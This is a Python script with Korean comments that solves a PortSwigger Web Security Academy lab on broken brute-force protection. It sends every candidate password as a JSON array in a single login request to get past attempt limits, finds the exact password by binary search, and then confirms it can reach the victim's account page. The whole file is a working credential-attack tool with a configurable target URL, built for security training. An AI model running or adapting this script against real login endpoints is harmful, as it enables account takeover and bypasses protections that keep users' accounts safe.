#!/usr/bin/env python3
"""
Authentication - Broken brute-force protection: multiple credentials per request
PortSwigger Lab:
  https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request

취약 로직:
  POST /login 이 JSON 을 받고, password 값에 "문자열 배열"을 허용한다.
  → 후보 비밀번호 전체를 한 요청에 담아 보내면, 그중 하나라도 맞으면 로그인됨.
  → 시도 제한(brute-force protection)을 우회하고 단일 요청으로 성공 가능.

추가 기능:
  --find-exact 로 로그인에 성공한 배열을 이진 탐색해 "정확한 비밀번호"를 특정한다.
  (배열 일부를 보내 302 여부를 보는 방식, O(log n)회)

사용 예시:
  python3 14-authentication-multiple-credentials.py \\
    --target "https://LAB-ID.web-security-academy.net" \\
    --victim carlos --verify
"""

import argparse
import importlib.util
import json
import os
import re
import sys

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_HERE = os.path.dirname(os.path.abspath(__file__))
_BF_PATH = os.path.join(_HERE, "14-authentication-brute-force.py")

TIMEOUT = 15
SUCCESS_CODES = (301, 302, 303, 307, 308)


def _load_bruteforce():
    spec = importlib.util.spec_from_file_location("auth_bruteforce", _BF_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


bf = _load_bruteforce()


def find_csrf(html: str, field: str = "csrf") -> str | None:
    m = (re.search(rf'name=["\']?{field}["\']?\s+value=["\']?([^"\'\s>]+)', html)
         or re.search(rf'value=["\']?([^"\'\s>]+)["\']?\s+name=["\']?{field}', html))
    return m.group(1) if m else None


def main() -> None:
    parser = argparse.ArgumentParser(
        description="multiple credentials per request 우회 brute-force"
    )
    parser.add_argument("--target", required=True,
                        help="대상 베이스 URL (예: https://LAB.web-security-academy.net)")
    parser.add_argument("--victim", default="carlos",
                        help="공격 대상 username (기본: carlos)")
    parser.add_argument("--passwords", default=None,
                        help=f"password 목록 (URL/파일/인라인). 기본: {bf.DEFAULT_PASSWORDS}")
    parser.add_argument("--login-path", default="/login",
                        help="로그인 경로 (기본: /login)")
    parser.add_argument("--username-field", default="username",
                        help="username JSON 키 (기본: username)")
    parser.add_argument("--password-field", default="password",
                        help="password JSON 키 (기본: password)")
    parser.add_argument("--account-path", default="/my-account",
                        help="검증용 계정 경로 (기본: /my-account)")
    parser.add_argument("--find-exact", dest="find_exact", action="store_true",
                        default=True, help="이진 탐색으로 정확한 비밀번호 특정 (기본: 수행)")
    parser.add_argument("--no-find-exact", dest="find_exact", action="store_false",
                        help="정확한 비밀번호 특정 생략")
    parser.add_argument("--verify", action="store_true",
                        help="로그인 후 계정 페이지 접근 확인")
    args = parser.parse_args()

    base = args.target.rstrip("/")
    login_url = base + args.login_path

    try:
        passwords = bf.load_wordlist(args.passwords, bf.DEFAULT_PASSWORDS)
    except Exception as e:
        print(f"[-] 목록 로딩 실패: {e}")
        sys.exit(1)

    print(f"[*] 대상      : {base}")
    print(f"    victim    : {args.victim}")
    print(f"    passwords : {len(passwords)}개 (한 요청에 배열로 전송)")

    def login_array(cands: list[str], session: requests.Session | None = None):
        s = session or requests.Session()
        s.verify = False
        payload = {args.username_field: args.victim, args.password_field: cands}
        resp = s.post(login_url, data=json.dumps(payload),
                      headers={"Content-Type": "application/json"},
                      timeout=TIMEOUT, allow_redirects=False)
        return resp, s

    # 1) 전체 목록을 한 요청에 넣어 로그인
    print(f"\n[*] 1단계 — 전체 후보 배열로 로그인 시도")
    resp, session = login_array(passwords)
    ok = resp.status_code in SUCCESS_CODES
    print(f"    status={resp.status_code} "
          f"location={resp.headers.get('Location', '')} → {'성공' if ok else '실패'}")
    if not ok:
        print("[-] 배열 전송이 통하지 않았습니다. Content-Type/필드명/응답을 확인하세요.")
        sys.exit(1)

    # 2) 이진 탐색으로 정확한 비밀번호 특정
    found = None
    if args.find_exact:
        print(f"\n[*] 2단계 — 이진 탐색으로 정확한 비밀번호 특정")
        lo, hi = 0, len(passwords)
        while hi - lo > 1:
            mid = (lo + hi) // 2
            left = passwords[lo:mid]
            r, _ = login_array(left)
            hit = r.status_code in SUCCESS_CODES
            print(f"    [{lo}:{mid}] {len(left)}개 → {r.status_code} "
                  f"({'포함' if hit else '아님'})")
            if hit:
                hi = mid
            else:
                lo = mid
        found = passwords[lo]
        print(f"\n[+] 정확한 비밀번호: {found}")
    else:
        print("\n[+] 배열 로그인 성공 (정확한 값은 --find-exact 로 특정)")

    # 3) 검증
    if args.verify:
        print(f"\n[*] 3단계 — 계정 페이지 접근 확인")
        candidates = [found] if found else passwords
        r, s2 = login_array(candidates)
        if r.status_code in SUCCESS_CODES:
            acct = s2.get(base + args.account_path, timeout=TIMEOUT, allow_redirects=True)
            print(f"    GET {args.account_path} → status={acct.status_code}, len={len(acct.text)}")
            m = re.search(r'(?i)your username is:?\s*(?:<[^>]+>)?\s*([^<\s]+)', acct.text)
            if m:
                print(f"[+] 로그인 사용자: {m.group(1)}")
            if acct.status_code == 200 and (not m or m.group(1).lower() == args.victim.lower()):
                print(f"[✓] {args.victim} 계정 로그인 확인")
            else:
                print("[?] 계정 페이지 확인 실패")
        else:
            print("    로그인 재시도 실패")

    if found:
        print(f"\n[=] 결과: {args.victim} / {found}")
    else:
        print(f"\n[=] 결과: {args.victim} 로그인 성공 (배열 우회)")


if __name__ == "__main__":
    main()
